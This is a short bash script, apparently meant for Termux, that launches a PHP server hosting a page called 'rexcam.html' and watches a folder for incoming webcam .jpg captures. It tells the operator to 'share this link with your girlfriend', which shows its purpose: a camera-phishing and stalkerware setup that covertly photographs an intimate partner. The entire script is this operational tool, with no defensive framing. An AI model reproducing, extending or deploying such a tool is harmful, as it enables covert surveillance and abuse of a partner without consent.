#!/bin/bash

echo "Starting Camera Capture Server..."
echo "Make sure you have php installed: pkg install php"

# Create directory for captured images
mkdir -p cam_captures

# Start PHP server
php -S 0.0.0.0:8080 rexcam.html 2>/dev/null &

echo "Server started at http://0.0.0.0:8080"
echo "Share this link with your girlfriend"
echo "Waiting for captures..."

# Monitor the cam_captures directory
inotifywait -m -e create cam_captures/ 2>/dev/null | while read path action file; do
    if [[ "$file" =~ \.jpg$ ]]; then
        echo "Cam file received: $file"
        # You can add notification here if needed
        # termux-notification -t "New Capture" -c "File: $file"
    fi
done